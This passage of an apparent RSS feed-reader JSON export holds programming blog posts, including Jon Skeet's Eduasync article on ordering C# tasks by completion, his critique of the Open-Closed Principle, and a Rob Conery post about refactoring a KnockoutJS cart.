don’t have to be perfect, but there’s simply no excuse for names such as “Form1” or “MyClass” which seem almost designed to carry no useful information whatsoever. Often simply the act of naming something can communicate meaning. Don’t be afraid to extract local variables in code just to clarify the meaning of some otherwise-obscure expression.</p><h3>Documentation</h3><p>I don’t think I’ve ever met a developer who actually enjoys writing documentation, but I think it’s hard to deny that it’s important. There tend to be very few things that are so precisely communicated just by the names of types, properties and methods that no further information is required. What is guaranteed about the data? How should it be used – and how should it not be used?</p><p>The form, style and detail level of documentation will vary from project to project, but don’t underestimate its value. Aside from behavioural  details, ask yourself what meaning you’re imposing on or assuming about the data you’re dealing with… what would happen if someone else made different assumptions? What could go wrong, and how can you prevent it by expressing your own understanding clearly? This isn’t just important for large projects with big teams, either – it’s entirely possible that the person who comes to the code with a different viewpoint is going to be you, six months later.</p><h2>Conclusion</h2><p>I apologise if this all sounds like motherhood and apple pie. I’m not saying anything new, after all – of course we all agree that we need to understand the meaning of the our data. I’m really not trying to waste your time though: I want you to take a moment to appreciate just how much it matters that we understand the data we work with, and how many problems can be avoided by putting effort into communicating that effectively and reading what others have written about their data.</p><p>There are other approaches we can take beyond those I’ve listed above, too – much more technically exciting ones – around static code analysis, contracts, complicated annotations and the like. I have nothing against them, but just understanding the value of semantics is a crucial starting point, and once everyone on your team agrees on that, you’ll be in a much better position to move forward and agree on the meaning of your data itself. From there, the world’s your oyster – if you see what I mean.</p><hr /><sup>1</sup>It doesn’t; references are passed by value, as even my non-programmer wife knows by now. That’s how often this myth comes up.<div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1833537\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/QJMAbYtTxjg\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1279}}
{"k":"0000000084","o":"0000015203","v":"001"}
{"_id":1280,"_uid":1280,"_dt":1373742620977,"_s":"a139ea04a61f42bf4bffd41bc465e82f"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/t0SgYtV4iDA/eduasync-part-19-ordering-by-completion-ahead-of-time.aspx","title":"Eduasync part 19: ordering by completion, ahead of time...","published":{"$wrap":"$date","v":1326752563000,"h":"2012-01-16T22:22:43.000Z"},"starred":false,"read":false,"content":"<p>Today's post involves the<a href=\"http://code.google.com/p/eduasync/source/browse/#hg%2Fsrc%2FMagicOrdering\">MagicOrdering project</a>in source control (project 28).</p><p>When I wrote<a href=\"http://msmvps.com/blogs/jon_skeet/archive/2011/11/22/eduasync-part-16-example-of-composition-majority-voting.aspx\">part 16 of Eduasync</a>, showing composition in the form of majority voting, one reader mailed me a<em>really</em>interesting suggestion. We don't really need to wait for<em>any</em>of the tasks to complete on each iteration of the loop - we only need to wait for the<em>next</em>task to complete. Now that sounds impossible - sure, it's great if we know the completion order of the tasks, but half the point of asynchrony is that many things can be happening at once, and we don't know when they'll complete. However, it's not as silly as it sounds.</p><p>If you give me a collection of tasks, I'll give you back another collection of tasks which will return the same results - but I'll order them so that the first returned task will have the same result as whichever of your original tasks completes first, and the second returned task will have the same result as whichever of your original tasks completes second, and so on. They won't be the<em>same</em>tasks as you gave me, reordered - but they'll be tasks with the same results. I'll propagate cancellation, exceptions and so on.</p><p>It still sounds impossible... until you realize that I don't have to associate one of my returned tasks with one of your original tasks<em>until it has completed</em>. Before anything has completed, all the tasks look the same. The trick is that as soon as I see one of your tasks complete, I can fetch the result and propagate it to the first of the tasks I've returned to you, using TaskCompletionSource&lt;T&gt;. When the second of your tasks completes, I propagate the result to the second of the returned tasks, etc. This is all quite easy using<a href=\"http://msdn.microsoft.com/en-us/library/dd235663.aspx\">Task&lt;T&gt;.ContinueWith</a>- barring a few caveats I'll mention later on.</p><p>Once we've built a method to do this, we can then<em>really easily</em>build a method which is the async equivalent of<a href=\"http://msdn.microsoft.com/en-us/library/system.threading.tasks.parallel.foreach.aspx\">Parallel.ForEach</a>(and indeed you could write multiple methods for the various overloads). This will execute a specific action on each task in turn, as it completes... it's<em>like</em>repeatedly calling<a href=\"http://msdn.microsoft.com/en-us/library/system.threading.tasks.task.whenany(v=vs.110).aspx\">Task.WhenAny</a>, but we only actually need to wait for one task at a time, because we know that the first task in our\"completion ordered\" collection will be the first one to complete (duh).</p><h3>Show me the code!</h3><p>Enough description - let's look at how we'll demonstrate both methods, and then how we implement them.</p><div class=\"code\"><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">async</span>Task PrintDelayedRandomTasksAsync()<br />{<br />    Random rng =<span class=\"Keyword\">new</span>Random();<br />   <span class=\"Linq\">var</span>values = Enumerable.Range(0, 10).Select(_ =&gt; rng.Next(3000)).ToList();<br />    Console.WriteLine(<span class=\"String\">\"Initial order: {0}\"</span>,<span class=\"ReferenceType\">string</span>.Join(<span class=\"String\">\"\"</span>, values));<br /><br />   <span class=\"Linq\">var</span>tasks = values.Select(DelayAsync);<br /><br />   <span class=\"Linq\">var</span>ordered = OrderByCompletion(tasks);<br /><br />    Console.WriteLine(<span class=\"String\">\"In order of completion:\"</span>);<br />   <span class=\"Modifier\">await</span>ForEach(ordered, Console.WriteLine);<br />}<br /><br /><span class=\"XmlComment\">///&lt;summary&gt;</span><br /><span class=\"XmlComment\">/// Returns a task which delays (asynchronously) by the given number of milliseconds,</span><br /><span class=\"XmlComment\">/// then return that same number back.</span><br /><span class=\"XmlComment\">///&lt;/summary&gt;</span><br /><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">async</span>Task&lt;<span class=\"ValueType\">int</span>&gt; DelayAsync(<span class=\"ValueType\">int</span>delayMillis)<br />{<br />   <span class=\"Modifier\">await</span>TaskEx.Delay(delayMillis);<br />   <span class=\"Statement\">return</span>delayMillis;<br />}</div><p>The idea is that we're going to create 10 tasks which each just wait for some random period of time, and return the same time period back. We'll create them in any old order - but obviously they should complete in (at least roughly) the same order as the returned numbers.</p><p>Once we've created the collection of tasks, we'll call OrderByCompletion to create a<em>second</em>collection of tasks, returning the same results but this time in completion order - so ordered.ElementAt(0) will be the first task to complete, for example.</p><p>Finally, we call ForEach and pass in the ordered task collection, along with Console.WriteLine as the action to take with each value. We await the resulting Task to mimic blocking until the foreach loop has finished. Note that we<em>could</em>make this a non-async method and just return the task returned by ForEach, given that that's our only await expression and it's right at the end of the method. This would be marginally faster, too - there's no need to build an extra state machine. See<a href=\"http://msdn.microsoft.com/en-us/magazine/hh456402.aspx\">Stephen Toub's article about async performance</a>for more information.</p><h3>ForEach</h3><p>I'd like to get ForEach out of the way first, as it's so simple: it's literally just iterating over the tasks, awaiting them and propagating the result to the action. We get the\"return a task which will wait until we've finished\" for free by virtue of making it an async method.</p><div class=\"code\"><span class=\"XmlComment\">///&lt;summary&gt;</span><br /><span class=\"XmlComment\">/// Executes the given action on each of the tasks in turn, in the order of</span><br /><span class=\"XmlComment\">/// the sequence. The action is passed the result of each task.</span><br /><span class=\"XmlComment\">///&lt;/summary&gt;</span><br /><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">async</span>Task ForEach&lt;T&gt;(IEnumerable&lt;Task&lt;T&gt;&gt; tasks, Action&lt;T&gt; action)<br />{<br />   <span class=\"Statement\">foreach</span>(<span class=\"Linq\">var</span>task<span class=\"Statement\">in</span>tasks)<br />    {<br />        T value =<span class=\"Modifier\">await</span>task;<br />        action(value);<br />    }<br />}</div><p>Simple, right? Let's get onto the meat...</p><h5>OrderByCompletion</h5><p>This is the tricky bit, and I've actually split it into two methods to make it slightly easier to comprehend. The PropagateResult method feels like it could be useful in other composition methods, too.</p><p>The basic plan is:</p><ul><li>Copy the input tasks to a list: we need to work out how many there are<em>and</em>iterate over them, so let's make sure we only iterate once</li><li>Create a collection of TaskCompletionSource&lt;T&gt; references, one for each input task. Note that we're not associating any particular input task with any particular completion source - we just need the same number of them</li><li>Declare an integer to keep track of\"the next available completion source\"</li><li>Attach a continuation to each input task which will be increment the counter we've just declared, and propagate the just-completed task's status</li><li>Return a view onto the collection of TaskCompletionSource&lt;T&gt; values, projecting each one to its Task property</li></ul><p>Once you're happy with the idea, the implementation isn't too surprising (although it<em>is</em>quite long):</p><div class=\"code\"><span class=\"XmlComment\">///&lt;summary&gt;</span><br /><span class=\"XmlComment\">/// Returns a sequence of tasks which will be observed to complete with the same set</span><br /><span class=\"XmlComment\">/// of results as the given input tasks, but in the order in which the original tasks complete.</span><br /><span class=\"XmlComment\">///&lt;/summary&gt;</span><br /><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span>IEnumerable&lt;Task&lt;T&gt;&gt; OrderByCompletion&lt;T&gt;(IEnumerable&lt;Task&lt;T&gt;&gt; inputTasks)<br />{<br />   <span class=\"InlineComment\">// Copy the input so we know it'll be stable, and we don't evaluate it twice</span><br />   <span class=\"Linq\">var</span>inputTaskList = inputTasks.ToList();<br /><br />   <span class=\"InlineComment\">// Could use Enumerable.Range here, if we wanted...</span><br />   <span class=\"Linq\">var</span>completionSourceList =<span class=\"Keyword\">new</span>List&lt;TaskCompletionSource&lt;T&gt;&gt;(inputTaskList.Count);<br />   <span class=\"Statement\">for</span>(<span class=\"ValueType\">int</span>i = 0; i&lt; inputTaskList.Count; i++)<br />    {<br />        completionSourceList.Add(<span class=\"Keyword\">new</span>TaskCompletionSource&lt;T&gt;());<br />    }<br /><br />   <span class=\"InlineComment\">// At any one time, this is\"the index of the box we've just filled\".</span><br />   <span class=\"InlineComment\">// It would be nice to make it nextIndex and start with 0, but Interlocked.Increment</span><br />   <span class=\"InlineComment\">// returns the incremented value...</span><br />   <span class=\"ValueType\">int</span>prevIndex = -1;<br /><br />   <span class=\"InlineComment\">// We don't have to create this outside the loop, but it makes it clearer</span><br />   <span class=\"InlineComment\">// that the continuation is the same for all tasks.</span><br />    Action&lt;Task&lt;T&gt;&gt; continuation = completedTask =&gt;<br />    {<br />       <span class=\"ValueType\">int</span>index = Interlocked.Increment(<span class=\"MethodParameter\">ref</span>prevIndex);<br />       <span class=\"Linq\">var</span>source = completionSourceList[index];<br />        PropagateResult(completedTask, source);<br />    };<br /><br />   <span class=\"Statement\">foreach</span>(<span class=\"Linq\">var</span>inputTask<span class=\"Statement\">in</span>inputTaskList)<br />    {<br />       <span class=\"InlineComment\">// TODO: Work out whether TaskScheduler.Default is really the right one to use.</span><br />        inputTask.ContinueWith(continuation,<br />                               CancellationToken.None,<br />                               TaskContinuationOptions.ExecuteSynchronously,<br />                               TaskScheduler.Default);<br />    }<br /><br />   <span class=\"Statement\">return</span>completionSourceList.Select(source =&gt; source.Task);<br />}<br /><br /><span class=\"XmlComment\">///&lt;summary&gt;</span><br /><span class=\"XmlComment\">/// Propagates the status of the given task (which must be completed) to a task completion source</span><br /><span class=\"XmlComment\">/// (which should not be).</span><br /><span class=\"XmlComment\">///&lt;/summary&gt;</span><br /><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>PropagateResult&lt;T&gt;(Task&lt;T&gt; completedTask,<br />    TaskCompletionSource&lt;T&gt; completionSource)<br />{<br />   <span class=\"Statement\">switch</span>(completedTask.Status)<br />    {<br />       <span class=\"Statement\">case</span>TaskStatus.Canceled:<br />            completionSource.TrySetCanceled();<br />           <span class=\"Statement\">break</span>;<br />       <span class=\"Statement\">case</span>TaskStatus.Faulted:<br />            completionSource.TrySetException(completedTask.Exception.InnerExceptions);<br />           <span class=\"Statement\">break</span>;<br />       <span class=\"Statement\">case</span>TaskStatus.RanToCompletion:<br />            completionSource.TrySetResult(completedTask.Result);<br />           <span class=\"Statement\">break</span>;<br />       <span class=\"Modifier\">default</span>:<br />           <span class=\"InlineComment\">// TODO: Work out whether this is really appropriate. Could set</span><br />           <span class=\"InlineComment\">// an exception in the completion source, of course...</span><br />           <span class=\"Statement\">throw</span> <span class=\"Keyword\">new</span>ArgumentException(<span class=\"String\">\"Task was not completed\"</span>);<br />    }<br />}</div><p>You'll notice there are a couple of TODO comments there. The exception in PropagateResult really<em>shouldn't</em>happen - the continuation shouldn't be called when the task hasn't completed. I still need to think carefully about how tasks should propagate exceptions though.</p><p>The arguments to ContinueWith are more tricky: working through my TimeMachine class and some unit tests with Bill Wagner last week showed just how little I know about how SynchronizationContext, the task awaiters, task schedulers, and TaskContinuationOptions.ExecuteSynchronously all interact. I would<em>definitely</em>need to look into that more deeply before TimeMachine was really ready for heavy use... which means<em>you</em>should probably be looking at the TPL in more depth too.</p><h3>Conclusion</h3><p>Sure enough, when you run the code, the results appear in order, as the tasks complete. Here's one sample of the output:</p><div class=\"code\">Initial order: 335 468 1842 1991 2512 2603 270 2854 1972 1327<br />In order of completion:<br />270<br />335<br />468<br />1327<br />1842<br />1972<br />1991<br />2512<br />2603<br />2854</div><p>TODOs aside, the code in this post is remarkable (which I can say with modesty, as I've only refactored it from the code sent to me by another reader and Stephen Toub). It makes me smile every time I<em>think</em>about the seemingly-impossible job it accomplishes. I suspect this approach could be useful in any number of composition blocks - it's definitely one to remember.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1804970\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/t0SgYtV4iDA\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1280}}
{"k":"0000000084","o":"0000002845","v":"001"}
{"_id":1281,"_uid":1281,"_dt":1373742620978,"_s":"d17c3e4709cd9a037d102faa9815a977"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/mkcrjatygrY/pair-coding-with-knockoutjs","title":"Pair Coding With KnockoutJS","published":{"$wrap":"$date","v":1361458800000,"h":"2013-02-21T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>I was lucky enough to get some help from Ryan Niemeyer (KnockoutJS core contributor) recently, and, like I do, I asked if I could record it. I love stuff like this: I need this to work well for the Real World, and I want to do it right.</p><p><img src='http://wekeroad.com/images/knockout_refactor_slide.png'/></p><p><h2>An Expert at Work</h2><p>Most of us can figure out what we're trying to do with a new toolset - it's all about reading the docs and playing around until the philosophy of the thing creeps its way in and the tool begins to fit our hand just a bit better.</p><p>Every now and again, though, you're reminded just how much you don't know. That was the case when I asked<a href=\"http://www.knockmeout.net/\">Ryan Niemeyer</a>to take a look at the<a href=\"http://github.com/tekpub/knockout-cart\">Knockout Cart</a>that I open sourced from Tekpub's codebase. I was proud of that thing but I also knew it needed a little help.</p><p>As with so many things - I was in a hurry, it worked, I felt like it was a decent initial release, etc. Anyway, Ryan joined me and from that we have our latest video on Tekpub:</p><iframe src=\"http://player.vimeo.com/video/60131454\" width=\"650\" height=\"362\" frameborder=\"0\" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe><p>This one is wall-to-wall coding, and Ryan doesn't miss a trick. Great stuff, and I was happy to be a part of it!<a href=\"http://tekpub.com/products/knockout_refactor\">You can watch the whole thing up at Tekpub</a></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=mkcrjatygrY:IzeUTyGpoS8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=mkcrjatygrY:IzeUTyGpoS8:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=mkcrjatygrY:IzeUTyGpoS8:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=mkcrjatygrY:IzeUTyGpoS8:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=mkcrjatygrY:IzeUTyGpoS8:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=mkcrjatygrY:IzeUTyGpoS8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=mkcrjatygrY:IzeUTyGpoS8:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/mkcrjatygrY\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1281}}
{"k":"0000000084","o":"0000002434","v":"001"}
{"_id":1282,"_uid":1282,"_dt":1373742620978,"_s":"2d7614ef94b1d1646ecb8e177c8c40e8"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/vL8hINxgSKI/new-tool-to-play-with-semanticmerge.aspx","title":"New tool to play with: SemanticMerge","published":{"$wrap":"$date","v":1366321103000,"h":"2013-04-18T21:38:23.000Z"},"starred":false,"read":false,"content":"<p>A little while ago I was contacted about a new merge tool from the company behind<a href=\"http://www.plasticscm.com/\">PlasticSCM</a>. (I haven't used Plastic myself, but I'd heard of it.) My initial reaction was that I wasn't interested in anything which required me to learn yet another source control system, but SemanticMerge is independent of PlasticSCM.</p><p>My interested was piqued when I learned that SemanticMerge is actually built on<a href=\"http://en.wikipedia.org/wiki/Microsoft_Roslyn\">Roslyn</a>. I don't generally care much about implementation details, but I'm looking out for uses of Roslyn outside Microsoft, partly to see if I can gain any inspiration for using it myself. Between the name and the implementation detail, it should be fairly obvious that this is a tool which understands changes in C# source code rather better than a plain text diff.</p><p>I've had SemanticMerge installed on one of my laptops for a month or so now. Unfortunately it's getting pretty light use – my main coding outside work is on<a href=\"http://noda-time.googlecode.com\">Noda Time</a>, and as I perform the vast majority of the commits, the only time I really need to perform merges is when I've forgotten to push a commit from one machine before switching to another. I've used it for diffs though, and it seems to be doing the right thing there – showing which members have been added, moved, changed etc.</p><p>I don't believe it can currently support multi-file changes – for example, spotting that a lot of changes are all due to a rename operation – but even if it doesn't right now, I suspect that may be worked on in the future. And of course, the merge functionality is the main point.</p><p>SemanticMerge is now in beta, so<a href=\"http://semanticmerge.com/\">pop over to the web site</a>and give it a try.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1827732\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/vL8hINxgSKI\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1282}}
{"k":"0000000084","o":"0000017116","v":"001"}
{"_id":1283,"_uid":1283,"_dt":1373742620978,"_s":"13f022341ee06ad5cc0e94670aaecfab"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/uPCzYxuuzoI/the-open-closed-principle-in-review.aspx","title":"The Open-Closed Principle, in review","published":{"$wrap":"$date","v":1363339321000,"h":"2013-03-15T09:22:01.000Z"},"starred":false,"read":false,"content":"<h2>Background</h2><p>I've been to a few talks on<a href=\"http://en.wikipedia.org/wiki/SOLID_(object-oriented_design)\">SOLID</a>before. Most of the principles seem pretty reasonable to me – but I've never\"got\" the open-closed principle (OCP from here on). At CodeMash this year, I mentioned this to the wonderful<a href=\"http://truncatedcodr.wordpress.com/\">Cori Drew</a>, who said that she'd been at a user group talk where she felt it was explained well. She mailed me a link to the<a href=\"http://usergroup.tv/videos/how-to-code-design-patterns\">user group video</a>, which I<em>finally</em>managed to get round to watching last week. (The OCP part is at around 1 hour 20.)</p><p>Unfortunately I still wasn't satisfied, so I thought I'd try to hit up the relevant literature. Obviously there are umpteen guides to OCP, but I decided to start with Wikipedia, and go from there. I mentioned my continuing disappointment on Twitter, and the conversation got lively. Uncle Bob Martin (one of the two\"canonical sources\" for OCP) wrote a follow-up blog post, and I decided it would be worth writing one of my own, too, which you're now reading.</p><p>I should say up-front that in some senses this blog post isn't so much about the details of the open-closed principle, as about the importance of careful choice of terminology at all levels. As we'll see later, when it comes to the\"true\" meaning of OCP, I'm pretty much with Uncle Bob: it's motherhood and apple pie. But I believe that meaning is much more clearly stated in various other principles, and that OCP as the expression of an idea is doing more harm than good.</p><h2>Reading material</h2><ul><li><a href=\"http://en.wikipedia.org/wiki/Open/closed_principle\">Wikipedia OCP entry</a></li><li><a href=\"http://www.objectmentor.com/resources/articles/ocp.pdf\">Uncle Bob Martin's 1996 paper</a></li><li><a href=\"http://codecourse.sourceforge.net/materials/The-Importance-of-Being-Closed.pdf\">Craig Larman's comparison with Protected Variation</a></li><li><a href=\"http://blog.8thlight.com/uncle-bob/2013/03/08/AnOpenAndClosedCase.html\">Uncle Bob's blog response</a></li></ul><h2>So what is it? (Part 1 – high level)</h2><p>This is where it gets interesting. You see, there appear to be several different interpretation of the principle – some only subtly distinct, others seemingly almost unrelated. Even without looking anything up, I knew an expanded version of the name:</p><blockquote><p>Modules should be open for extension and closed for modification.</p></blockquote><p>The version quoted in Wikipedia and in Uncle Bob's paper actually uses\"Software entities (classes, modules, functions, etc.)\" instead of modules, but I'm not sure that really helps. Now I'm not naïve enough to expect everything in a principle to be clear just from the title, but I do expect<em>some</em>light to be shed. In this case, unfortunately I'm none the wiser.\"Open\" and\"closed\" sound permissive and restrictive respectively, but without very concrete ideas about what\"extension\" and\"modification\" mean, it's hard to tell much more.</p><p>Fair enough – so we read on to the next level. Unfortunately I don't have Bertrand Meyer's\"Object-Oriented Software Construction\" book (which I take to be the original), but Uncle Bob's paper is freely available. Wikipedia's summary of Meyer's version is:</p><blockquote><p>The idea was that once completed, the implementation of a class could only be modified to correct errors; new or changed features would require that a different class be created. That class could reuse coding from the original class through inheritance. The derived subclass might or might not have the same interface as the original class.</p><p>Meyer's definition advocates implementation inheritance. Implementation can be reused through inheritance but interface specifications need not be. The existing implementation is closed to modifications, and new implementations need not implement the existing interface.</p></blockquote><p>And Uncle Bob's high level description is:</p><blockquote><p>Modules that conform to the open-closed principle have two primary attributes.</p><ol><li>They are\"Open For Extension\". This means that the behavior of the module can be extended. That we can make the module behave in new and different ways as the requirements of the application change, or to meet the needs of new applications.</li><li>They are\"Closed for Modiﬁcation\". The source code of such a module is inviolate. No one is allowed to make source code changes to it.</li></ol></blockquote><p>I immediately took a dislike to both of these descriptions. Both of them specifically say that the source code can't be changed, and the description of Meyer's approach to\"make a change by extending a class\" feels like a ghastly abuse of inheritance to me... and goes firmly against my (continued) belief in Josh Bloch's advice of\"design for inheritance or prohibit it\" – where in the majority of cases, designing a<em>class</em>for inheritance involves an awful lot of work for little gain. Designing an<em>interface</em>(or pure abstract class) still involves work, but with fewer restrictions and risks.</p><p>Craig Larman's article uses the term\"closed\" in a<em>much</em>more reasonable way, to my mind:</p><blockquote><p>Also, the phrase\"closed with respect to X\" means that clients are not affected if X changes.</p></blockquote><p>When I say\"more reasonable way\" I mean in terms of how I want to write code... not in terms of the use of the word\"closed\". This is simply not how the word\"closed\" is used elsewhere in my experience. In the rare cases where\"closed\"<em>is</em>used with\"to\", it's usually in terms of what's not allowed in:\"This bar is closed to under 18s\" for example. Indeed, that's how I read\"closed to modification\" and that appears to be backed up by the two quotes which say that once a class is complete, the source code cannot be changed.</p><p>Likewise the meaning of\"open for extension\" seems unusual to me. I'd argue that the intuitive meaning is\"can be extended\" – where the use of the term\"extended\" certainly nods towards inheritance, even if it's not intended meaning. If the idea is\"we can make the module behave differently\" – as Uncle Bob's description suggests – then\"open for extension\" is a very odd way of expressing that idea. I'd even argue that in the example given later, it's not the\"open\" module that behaves differently – it's the<em>combination</em>of the module and its collaborators, acting as a unified program, which behaves differently after some aspects are modified.</p><h2>So what is it? (Part 2 – more detail)</h2><p>Reading on through the rest of Uncle Bob's paper, the ideas become much more familiar. There's a reasonable example of a function which is asked to draw a collection of shapes: the bad code is aware of all the types of shape available, and handles each one separately. The good code uses an abstraction where each shape (Circle, Square) knows how to draw itself and inherits from a common base class (Shape). Great stuff... but what's that got to do with what was described above? How are the concepts of\"open\" and\"closed\" clarified?</p><p>The answer is that they're not. The word\"open\" doesn't occur anywhere in the rest of the text, other than as part of the term\"open-closed principle\" or as a label for\"open client\". While it's perhaps rather easier to see this in hindsight, I suspect that any time a section which is meant to clarify a concept doesn't use some of the key words used to describe the concept in a nutshell, that description should be treated as suspect.</p><p>The word\"closed\" appears more often, but<em>only</em>in terms of\"closed against\" which is never actually defined. (Is\"closed against\" the same as\"closed for\"?) Without Craig Larman's explanation, sentences like this make little sense to me:</p><blockquote><p>The function DrawAllShapes does not conform to the open-closed principle because it cannot be closed against new kinds of shapes.</p></blockquote><p>Even Craig's explanation feels somewhat at odds with Uncle Bob's usage, as it talks about<em>clients</em>being affected. This is another of the issues I have with the original two descriptions: they talk about a<em>single module</em>being open/closed, whereas we're dealing with abstractions where there are naturally at least two pieces of code involved (and usually three). Craig's description of changes in one module not affecting clients is describing a<em>relationship</em>– which is a far more useful way of approaching things. Even thinking about the shape example, I'm getting increasingly confused about exactly what's open and what's closed. It feels to me like it's neither the concrete shape classes nor the shape-drawing code which is open or closed – it's the interface between the two; the abstract Shape class. After all, these statements seem reasonable:</p><ul><li>The Shape class is open for extension: there can be many different concrete subclasses, and code which only depends on the Shape class doesn't need to know about them in order to use them when they are presented as shapes.</li><li>The Shape class is closed for modification: no existing functions can be removed (as they may be relied on by existing clients) and no new pure virtual functions can be added (as they will not be implemented by existing subclasses).</li></ul><p>It's still not how I'd choose to express it, but at least it feels like it makes sense in very concrete terms. It doesn't work well with how Uncle Bob uses the term\"closed\" though, so I still think I may be on a different page when it comes to that meaning. (Uncle Bob does also make the point that any significant program isn't going to adhere to the principle completely in every part of the code – but in order to judge where it's appropriate to be closed, I do really need to understand what being closed means.)</p><p>Just to make it crystal clear, other than the use of the word\"closed,\" the low-level description of what's good and what's bad, and why, is absolutely fine. I really have no problems with it. As I said at the start, the idea being expressed makes perfect sense. It just doesn't work (for me) when expressed in the terms used at a higher level.</p><h2>Protected Variation</h2><p>By contrast, let's look at a closely related idea which I hadn't actually heard about before I started all this research: protected variation. This name was apparently coined by Alistair Cockburn, and Craig Larman either quotes or paraphrases this as:</p><blockquote><p>Identify points of predicted variation and create a stable interface around them.</p></blockquote><p>Now that's a description I can immediately identify with. Every single word of it makes sense to me, even without reading any more of Craig's article. (I<em>have</em>read the rest, obviously, and I'd encourage others to do so.) This goes back to Josh Bloch's\"design for inheritance or prohibit it\" motto: identifying points of predicted variation is hard, and it's<em>necessary</em>in order to create a stable interface which is neither too constrictive for implementations nor too woolly for clients. With class inheritance there's the additional concern of interactions within a class hierarchy when a virtual method is called.</p><p>So in Uncle Bob's Shape example,<em>all</em>there is is a point of predicted variation: how the shape is drawn. PV suggests the converse as well – that as well as points of predicted variation, there may be points which will<em>not</em>vary. That's inherent in the API to some extent – every shape must be capable of drawing itself with no further information (the Draw method has no parameters) but it could also be extended to non-virtual aspects. For example, we could decide that every shape has one (and only one) colour, which will not change during its lifetime. That can be implemented in the Shape class itself – with no predicted variation, there's no need of polymorphism.</p><p>Of course, the costs of incorrectly predicting variation can be high: if you predict more variation than is actually warranted, you waste effort on over-engineering. If you predict<em>less</em>variation than is required, you usually end up<em>either</em>having to change quite a lot of code (if it's all under your control)<em>or</em>having to come up with an\"extended\" interface. There's the other aspect of shirking responsibility on this predicted variation to some extent, by making some parts\"optional\" – that's like saying,\"We know implementations will vary here in an incompatible way, but we're not going to try to deal with it in the API. Good luck!\" This usually arises in collection APIs, around mutating operations which may or may not be valid (based on whether the collection is mutable or not).</p><p>Not only is PV easy to understand – it's easy to remember for its comedy value, at least if you're a fan of<a href=\"http://en.wikipedia.org/wiki/The_Hitchhiker's_Guide_to_the_Galaxy\">The Hitchhiker's Guide to the Galaxy</a>. Remember Vroomfondel and Majikthise, the philosophers who invaded Cruxwan University just as Deep Thought was about to announce the answer to Life, the Universe, and Everything? Even though they were arguing with programmers, it sounds like they were actually the ones with software engineering experience:</p><blockquote><p>\"I'll tell you what the problem is mate,\" said Majikthise,\"demarcation, that's the problem!\"</p><p>[...]</p><p>\"That's right!\" shouted Vroomfondel,\"we demand rigidly defined areas of doubt and uncertainty!\"</p></blockquote><p>That sounds like a pretty good alternative description of Protected Variation to me.</p><h2>Conclusion</h2><p>So, that's what I don't like about OCP. The name, and the broad description – both of which I believe to be unhelpful, and poorly understood. (While I've obviously considered the possibility that I'm the only one who finds it confusing, I've heard enough variation in the explanations of it to suggest that I'm really<em>not</em>the only one.)</p><p>That sounds like a triviality, but I think it's rather important. I suspect that OCP has been at least mentioned in passing in thousands if not tends of thousands of user groups and conferences. The purpose of such gatherings is largely for communication of ideas – and when a sound idea is poorly expressed, an opportunity is wasted. I suspect that any time Uncle Bob has personally presented it in detail, the idea has sunk in appropriately – possibly after some initial confusion about the terminology. But what about all the misinterpretations and\"glancing blows\" where OCP is only mentioned as a good thing that clearly everyone wants to adhere to, with no explanation beyond the obscure ones described in part one above? How many times did they shed more confusion than light?</p><p>I believe more people are familiar with Uncle Bob's work on OCP than Bertrand Meyer's. Further, I suspect that if Bertrand Meyer hadn't already introduced the name and brief description, Uncle Bob may well have come up with far more descriptive ones himself, and the world would have been a better place. Fortunately, we do<em>have</em>a better name and description for a concept which is at least very closely related. (I'm not going to claim PV and OCP are identical, but close enough for a lot of uses.)</p><p>Ultimately, words matter – particularly when it comes to single sentence descriptions which act as soundbytes; shorthand for communicating a complex idea. It's not about whether the more complex idea can be understood after carefully reading thorough explanations. It's about whether the shorthand conveys the essence of the idea in a clear way. On that front, I believe the open-closed principle fails – which is why I'd love to see it retired in favour of more accessible ones.</p><h3>Note for new readers</h3><p>I suspect this post may end up being read more widely than most of my blog entries. If you're going to leave a comment, please be aware that the CAPTCHA doesn't work on Chrome. I'm<a 